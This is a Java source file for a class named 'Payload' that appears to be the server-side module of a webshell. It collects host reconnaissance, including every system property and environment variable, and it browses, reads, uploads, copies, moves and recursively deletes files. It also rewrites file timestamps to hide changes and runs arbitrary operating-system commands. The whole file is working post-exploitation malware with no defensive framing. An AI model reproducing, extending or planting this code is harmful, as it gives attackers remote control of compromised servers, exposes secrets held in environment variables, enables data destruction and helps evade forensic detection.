package org.example;

import java.awt.Rectangle;
import java.awt.Robot;
import java.awt.Toolkit;
import java.awt.image.BufferedImage;
import java.io.*;
import java.lang.reflect.Array;
import java.lang.reflect.Constructor;
import java.lang.reflect.Field;
import java.lang.reflect.Method;
import java.net.InetAddress;
import java.net.URL;
import java.sql.Connection;
import java.sql.Driver;
import java.sql.DriverManager;
import java.sql.ResultSet;
import java.sql.ResultSetMetaData;
import java.sql.Statement;
import java.text.SimpleDateFormat;
import java.util.ArrayList;
import java.util.Arrays;
import java.util.Date;
import java.util.Enumeration;
import java.util.HashMap;
import java.util.Hashtable;
import java.util.Iterator;
import java.util.List;
import java.util.Map;
import java.util.Properties;
import java.util.Random;
import java.util.zip.GZIPInputStream;
import java.util.zip.GZIPOutputStream;
import javax.imageio.ImageIO;

public class Payload extends ClassLoader {
    ByteArrayOutputStream outputStream;
    Object servletRequest;
    Map session;
    static Class class$3;
    static Class class$5;
    static Class class$9;
    Method getMethodByClass(Class var1, String var2, Class[] var3) {
        Method var4 = null;

        while(var1 != null) {
            try {
                var4 = var1.getDeclaredMethod(var2, var3);
                var1 = null;
            } catch (Exception var5) {
                var1 = var1.getSuperclass();
            }
        }

        return var4;
    }
    public String getRealPath() {
        String var1 = (new File("")).getAbsoluteFile() + "/";
        if (this.servletRequest != null) {
            try {
                Method var2 = this.getMethodByClass(this.servletRequest.getClass(), "getServletContext", new Class[0]);
                Object var3 = var2.invoke(this.servletRequest, (Object[])null);
                if (var3 != null) {
                    Class var4 = var3.getClass();
                    Class[] var5 = new Class[1];
                    Class var10002 = class$3;
                    if (var10002 == null) {
                        try {
                            var10002 = Class.forName("java.lang.String");
                        } catch (ClassNotFoundException var8) {
                            throw new NoClassDefFoundError(var8.getMessage());
                        }

                        class$3 = var10002;
                    }

                    var5[0] = var10002;
                    Method var6 = this.getMethodByClass(var4, "getRealPath", var5);
                    if (var6 != null) {
                        Object var7 = var6.invoke(var3, "/");
                        return var7 != null ? var7.toString() : var1;
                    }
                }
            } catch (Throwable var9) {
            }
        }

        return var1;
    }
    public String listFileRoot() {
        File[] var1 = File.listRoots();
        String var2 = new String();

        for(int var3 = 0; var3 < var1.length; ++var3) {
            var2 = var2 + var1[var3].getPath();
            var2 = var2 + ";";
        }

        return var2;
    }
    public static String getLocalIPList() {
        ArrayList var0 = new ArrayList();

        try {
            Class var1 = Class.forName("java.net.NetworkInterface");
            Method var2 = var1.getMethod("getNetworkInterfaces");
            Method var3 = var1.getMethod("getInetAddresses");
            Enumeration var4 = (Enumeration)var2.invoke((Object)null);

            while(var4.hasMoreElements()) {
                Object var5 = var4.nextElement();
                Enumeration var6 = (Enumeration)var3.invoke(var5);

                while(var6.hasMoreElements()) {
                    InetAddress var7 = (InetAddress)var6.nextElement();
                    if (var7 != null) {
                        String var8 = var7.getHostAddress();
                        var0.add(var8);
                    }
                }
            }
        } catch (Throwable var9) {
        }

        Iterator var10 = var0.iterator();
        StringBuffer var11 = new StringBuffer();
        var11.append("[");

        while(var10.hasNext()) {
            Object var12 = var10.next();
            var11.append(var12.toString());
            var11.append(",");
        }

        if (var11.length() > 1) {
            var11.deleteCharAt(var11.length() - 1);
        }

        var11.append("]");
        return var11.toString();
    }
    public Map getEnv() {
        try {
            Class var10000 = class$9;
            if (var10000 == null) {
                try {
                    var10000 = Class.forName("java.lang.System");
                } catch (ClassNotFoundException var1) {
                    throw new NoClassDefFoundError(var1.getMessage());
                }

                class$9 = var10000;
            }

            return (Map)var10000.getMethod("getenv").invoke((Object)null);
        } catch (Throwable var2) {
            return null;
        }
    }
    public byte[] getBasicsInfo(String[] info) {
        String var1 = "";

        try {
            Enumeration var2 = System.getProperties().keys();
            var1 = var1 + "FileRoot : " + this.listFileRoot() + "\n";
            var1 = var1 + "CurrentDir : " + (new File("")).getAbsoluteFile() + "/" + "\n";
            var1 = var1 + "CurrentUser : " + System.getProperty("user.name") + "\n";
            var1 = var1 + "ProcessArch : " + System.getProperty("sun.arch.data.model") + "\n";

            String var9;
            try {
                var9 = System.getProperty("java.io.tmpdir");
                char var4 = var9.charAt(var9.length() - 1);
                if (var4 != '\\' && var4 != '/') {
                    var9 = var9 + File.separator;
                }

                var1 = var1 + "TempDirectory : " + var9 + "\n";
            } catch (Exception var7) {
            }

            var1 = var1 + "RealFile : " + this.getRealPath() + "\n";

            try {
                var1 = var1 + "OsInfo : os.name: " + System.getProperty("os.name") + " os.version: " + System.getProperty("os.version") + " os.arch: " + System.getProperty("os.arch") + "\n";
            } catch (Exception var6) {
                var1 = var1 + "OsInfo : " + var6.getMessage() + "\n";
            }

            for(var1 = var1 + "IPList : " + getLocalIPList() + "\n"; var2.hasMoreElements(); var1 = var1 + var9 + " : " + System.getProperty(var9) + "\n") {
                var9 = (String)var2.nextElement();
            }

            Map var11 = this.getEnv();
            String var10;
            if (var11 != null) {
                for(Iterator var5 = var11.keySet().iterator(); var5.hasNext(); var1 = var1 + var10 + " : " + var11.get(var10) + "\n") {
                    var10 = (String)var5.next();
                }
            }

            return var1.getBytes();
        } catch (Exception var8) {
            StringBuffer var3 = new StringBuffer();
            var3.append(var1);
            var3.append("Exception errMsg:");
            var3.append(var8.getMessage());
            return var3.toString().getBytes();
        }
    }

    public byte[] getFile(String[] dirName) {
        String var1 = dirName[0];
        HashMap var2 = new HashMap();
        if (var1 != null) {
            var1 = var1.trim();

            try {
                File var3File = new File(var1);
                String var3 = var3File.getAbsoluteFile() + "/";

                // 检查是否是文件
                if (var3File.isFile()) {
                    HashMap var7 = new HashMap();
                    try {
                        var7.put("0", var3File.getName());
                        var7.put("1", "1"); // 是文件
                        var7.put("2", (new SimpleDateFormat("yyyy-MM-dd HH:mm:ss")).format(new Date(var3File.lastModified())));
                        var7.put("3", Long.toString(var3File.length()));

                        StringBuffer var9 = (new StringBuffer(String.valueOf(var3File.canRead() ? "R" : "")))
                                .append(var3File.canWrite() ? "W" : "");

                        try {
                            Class var10001 = class$5;
                            if (var10001 == null) {
                                try {
                                    var10001 = Class.forName("java.io.File");
                                } catch (ClassNotFoundException var12) {
                                    throw new NoClassDefFoundError(var12.getMessage());
                                }
                                class$5 = var10001;
                            }

                            Method var10 = getMethodByClass(var10001, "canExecute", (Class[])null);
                            if (var10 != null) {
                                Boolean var11 = (Boolean) var10.invoke(var3File);
                                if (var11) {
                                    var9.append("X");
                                }
                            }
                        } catch (Throwable var13) {
                            // 忽略 execute 检查异常
                        }

                        String var17 = var9.toString();
                        var7.put("4", var17 != null && var17.trim().length() != 0 ? var17 : "F");
                    } catch (Throwable var14) {
                        var7.put("errMsg", var14.getMessage());
                    }

                    var2.put("0", var7.toString()); // 单个文件作为第0项
                    var2.put("count", "1");
                    var2.put("currentFile", var3File.getAbsolutePath());
                    return convertToJson(var2);
                }

                // 原有目录处理逻辑（未改动）
                File var16 = new File(var3);
                if (var16.exists() && var16.isDirectory()) {
                    File[] var5 = var16.listFiles();
                    if (var5 != null) {
                        for (int var6 = 0; var6 < var5.length; ++var6) {
                            HashMap var7 = new HashMap();
                            File var8 = var5[var6];

                            try {
                                var7.put("0", var8.getName());
                                var7.put("1", var8.isDirectory() ? "0" : "1");
                                var7.put("2", (new SimpleDateFormat("yyyy-MM-dd HH:mm:ss")).format(new Date(var8.lastModified())));
                                var7.put("3", Long.toString(var8.length()));

                                StringBuffer var9 = (new StringBuffer(String.valueOf(var8.canRead() ? "R" : "")))
                                        .append(var8.canWrite() ? "W" : "");

                                try {
                                    Class var10001 = class$5;
                                    if (var10001 == null) {
                                        try {
                                            var10001 = Class.forName("java.io.File");
                                        } catch (ClassNotFoundException var12) {
                                            throw new NoClassDefFoundError(var12.getMessage());
                                        }
                                        class$5 = var10001;
                                    }

                                    Method var10 = getMethodByClass(var10001, "canExecute", (Class[]) null);
                                    if (var10 != null) {
                                        Boolean var11 = (Boolean) var10.invoke(var8);
                                        if (var11) {
                                            var9.append("X");
                                        }
                                    }
                                } catch (Throwable var13) {
                                }

                                String var17 = var9.toString();
                                var7.put("4", var17 != null && var17.trim().length() != 0 ? var17 : "F");
                            } catch (Throwable var14) {
                                var7.put("errMsg", var14.getMessage());
                            }

                            var2.put(String.valueOf(var6), String.valueOf(var7));
                        }

                        var2.put("count", String.valueOf(var5.length));
                        var2.put("currentDir", var3);
                    }
                } else {
                    var2.put("errMsg", "Path does not exist or is not a directory or file: " + var1);
                }
            } catch (Exception var15) {
                StringBuffer var4 = new StringBuffer();
                var4.append("Exception errMsg:");
                var4.append(var15.getMessage());
                var2.put("errMsg", var4.toString());
            }
        } else {
            var2.put("errMsg", "No parameter dirName");
        }

        return convertToJson(var2);
    }

    public static byte[] convertToJson(HashMap<String, Object> map) {
        StringBuilder jsonBuilder = new StringBuilder();
        jsonBuilder.append("{");

        for (Map.Entry<String, Object> entry : map.entrySet()) {
            jsonBuilder.append("\"").append(entry.getKey()).append("\":");

            // 递归处理嵌套的 HashMap
            if (entry.getValue() instanceof HashMap) {
                jsonBuilder.append(convertToJson((HashMap<String, Object>) entry.getValue()));
            } else if (entry.getValue() instanceof String) {
                jsonBuilder.append("\"").append(entry.getValue()).append("\"");
            } else {
                jsonBuilder.append(entry.getValue());
            }
            jsonBuilder.append(","); // 添加逗号分隔
        }

        // 去掉最后一个逗号
        if (jsonBuilder.length() > 1) {
            jsonBuilder.setLength(jsonBuilder.length() - 1);
        }

        jsonBuilder.append("}");
        return jsonBuilder.toString().getBytes();
    }

    private byte[] readInputStream(InputStream var1, int var2) {
        byte[] var3 = new byte[var2];
        int var4 = 0;

        try {
            while((var4 += var1.read(var3, var4, var3.length - var4)) < var3.length) {
            }
        } catch (IOException var5) {
        }

        return var3;
    }
    public byte[] readFile(String[] fileName) {
        String var1 = fileName[0];
        if (var1 != null) {
            File var2 = new File(var1);

            try {
                if (var2.exists() && var2.isFile()) {
                    if (var2.length() > 204800L) {
                        return "The file is too large, please use the large file to download".getBytes();
                    } else {
                        byte[] var3 = new byte[(int)var2.length()];
                        FileInputStream var4;
                        if (var3.length > 0) {
                            var4 = new FileInputStream(var2);
                            var3 = this.readInputStream(var4, var3.length);
                            var4.close();
                        } else {
                            var3 = new byte[204800];
                            var4 = new FileInputStream(var2);
                            int var5 = var4.read(var3);
                            if (var5 > 0) {
                                var3 = new byte[var5];
                                System.arraycopy(var3, 0, var3, 0, var3.length);
                            }

                            var4.close();
                        }

                        return var3;
                    }
                } else {
                    return "file does not exist".getBytes();
                }
            } catch (Exception var6) {
                return var6.getMessage().getBytes();
            }
        } else {
            return "No parameter fileName".getBytes();
        }
    }

    public byte[] uploadFile(String[] FileData) {
        String var1 = FileData[0];
        byte[] var2 = FileData[1].getBytes();
        if (var1 != null && var2 != null) {
            try {
                File var3 = new File(var1);
                var3.createNewFile();
                FileOutputStream var4 = new FileOutputStream(var3);
                var4.write(var2);
                var4.close();
                return "ok".getBytes();
            } catch (Exception var5) {
                return var5.getMessage().getBytes();
            }
        } else {
            return "No parameter fileName and fileValue".getBytes();
        }
    }

    public byte[] copyFile(String[] SDfileName) {
        String var1 = SDfileName[0];
        String var2 = SDfileName[1];
        if (var1 != null && var2 != null) {
            File var3 = new File(var1);
            File var4 = new File(var2);

            try {
                if (var3.exists() && var3.isFile()) {
                    FileInputStream var5 = new FileInputStream(var3);
                    FileOutputStream var6 = new FileOutputStream(var4);
                    byte[] var7 = new byte[5120];

                    int var8;
                    while((var8 = var5.read(var7)) > -1) {
                        var6.write(var7, 0, var8);
                    }

                    var5.close();
                    var6.close();
                    return "ok".getBytes();
                } else {
                    return "The target does not exist or is not a file".getBytes();
                }
            } catch (Exception var9) {
                return var9.getMessage().getBytes();
            }
        } else {
            return "No parameter srcFileName,destFileName".getBytes();
        }
    }

    public byte[] moveFile(String[] SDfileName) {
        String var1 = SDfileName[0];
        String var2 = SDfileName[1];
        if (var1 != null && var2 != null) {
            File var3 = new File(var1);

            try {
                if (var3.exists()) {
                    return var3.renameTo(new File(var2)) ? "ok".getBytes() : "fail".getBytes();
                } else {
                    return "The target does not exist".getBytes();
                }
            } catch (Exception var6) {
                StringBuffer var5 = new StringBuffer();
                var5.append("Exception errMsg:");
                var5.append(var6.getMessage());
                return var5.toString().getBytes();
            }
        } else {
            return "No parameter srcFileName,destFileName".getBytes();
        }
    }

    public void deleteFiles(File var1) throws Exception {
        if (var1.isDirectory()) {
            File[] var2 = var1.listFiles();

            for(int var3 = 0; var3 < var2.length; ++var3) {
                File var4 = var2[var3];
                this.deleteFiles(var4);
            }
        }

        var1.delete();
    }
    public byte[] deleteFile(String[] fileName) {
        String var1 = fileName[0];
        String var2 = "mem://";
        if (var1 != null) {
            if (var1.startsWith(var2)) {
                this.session.remove(var1);
                return "ok".getBytes();
            } else {
                try {
                    File var3 = new File(var1);
                    this.deleteFiles(var3);
                    return "ok".getBytes();
                } catch (Exception var5) {
                    StringBuffer var4 = new StringBuffer();
                    var4.append("Exception errMsg:");
                    var4.append(var5.getMessage());
                    return var4.toString().getBytes();
                }
            }
        } else {
            return "No parameter fileName".getBytes();
        }
    }

    public byte[] setFileAtt(String[] fileAttr){
        File file = new File(fileAttr[0]);
        String lasttime =  "last time: "+(new SimpleDateFormat("yyyy-MM-dd HH:mm:ss")).format(new Date(file.lastModified()));
        String result = "";
//        System.out.println("last time: "+(new SimpleDateFormat("yyyy-MM-dd HH:mm:ss")).format(new Date(file.lastModified())));
        SimpleDateFormat dateFormat = new SimpleDateFormat("yyyy-MM-dd HH:mm:ss");
        try {
            // 将字符串转换为 Date 对象
            Date newDate = dateFormat.parse(fileAttr[1]);
            // 获取时间戳
            long newTimestamp = newDate.getTime();
            // 设置文件的最后修改时间
            boolean success = file.setLastModified(newTimestamp);
            if (success) {
                result = lasttime + "\nnew time:" + fileAttr[1];
            } else {
                result = "can't change file time";
            }
        } catch (Exception e) {
            result = "parse date error: " + e.getMessage();
        }
        return result.getBytes();
    }

    public byte[] execCommand(String[] Command){
        ProcessBuilder processBuilder = new ProcessBuilder(Command);
        String commandresult = "";
        try {
            Process process = processBuilder.start();

            InputStream inputStream = process.getInputStream();

            // 使用 BufferedReader 读取输出
            try (BufferedReader reader = new BufferedReader(new InputStreamReader(inputStream))) {
                String line;
                while ((line = reader.readLine()) != null) {
                    commandresult += line + "\n";
                }
            }
            process.waitFor();
        } catch (IOException | InterruptedException e) {
            e.printStackTrace();
        }
        return commandresult.getBytes();
    }
}
